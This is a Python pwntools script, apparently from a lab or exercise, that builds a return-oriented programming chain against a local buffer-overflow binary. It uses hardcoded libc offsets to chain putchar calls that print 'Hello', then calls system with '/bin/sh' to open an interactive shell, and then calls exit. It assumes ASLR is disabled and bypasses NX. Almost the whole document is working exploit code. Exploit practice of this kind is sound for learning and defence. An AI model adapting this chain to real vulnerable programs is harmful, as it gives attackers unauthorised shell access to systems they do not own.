# Example implementation to produce ROP chain for vulnerable program,
# and print 'Hello, world!'

# Program is taking input as argument, as has buffer overflow vulneralibity


# We are using CTP framework 'pwntools' https://github.com/Gallopsled/pwntools

# We are expecting, that ASLR is disabled. Bypassing NX bit

from pwn import log, context
from pwnlib.tubes.process import process
from pwnlib.util.packing import p32, pack
from pwnlib.exception import PwnlibException

context(arch='i386', os='linux')

# NOTE this might vary based on machine
libc_entry = 0xf7c00000

# NOTE that you might have different offsets, depending on libc version
#  and compiler settings
#offset_ppr = 0x00196a7d  # pop/pop/ret gadget 
offset_pr = 0x00196a7d  # pop ebx;ret

offset_exit = 0x000395d0
offset_putchar = 0x00072b10

offset_system = 0x00046f30
offset_bin_sh = 0x001b30d0

# 0xf7e6740f


def main():
    # payload = ""
    padChar2 = b"\x90"
    padSize = 32
    # Initial payload

    hello = "\nHello\n"  # We are using putchar function from libc
    # as example to chain multiple function calls/gadgets
    # For each character in our phrase, there is putchar call
    payload = padChar2 * padSize

    for char in hello:  # Generate payload for printing 'Hello, world!'
        payload += p32(libc_entry + offset_putchar)
        payload += p32(libc_entry + offset_pr)
        payload += pack(ord(char), 32, 'little', False).replace(b"\x00", b"\xff")
    
    payload += p32(libc_entry + offset_system)
    payload += p32(libc_entry + offset_pr)
    payload += p32(libc_entry + offset_bin_sh)
    payload += p32(libc_entry + offset_pr)

    for char in hello:  # Generate payload for printing 'Hello, world!'
        payload += p32(libc_entry + offset_putchar)
        payload += p32(libc_entry + offset_pr)
        payload += pack(ord(char), 32, 'little', False).replace(b"\x00", b"\xff")

    
    #payload += p32(libc_entry + offset_pr)
    #payload += p32(libc_entry + offset_system)
    #payload += p32(libc_entry + offset_pr)
    #payload += p32(libc_entry + offset_bin_sh)



    payload += p32(libc_entry + offset_pr)
    payload += p32(0xffffffff)
    payload += p32(libc_entry + offset_exit)

    # Writing payload to txt file just in case,
    # if we want to run program without script
    f = open("payload.txt", "w+")
    f.write(str(payload))
    f.close

    # C program is using payload as args
    try:
        p = process(["../vuln_progs/Overflow", payload])
        p.interactive()
        log.info(p.recvall(timeout=0.5))
    except PwnlibException:
        print("Nulls in arguments.")


if __name__ == "__main__":
    main()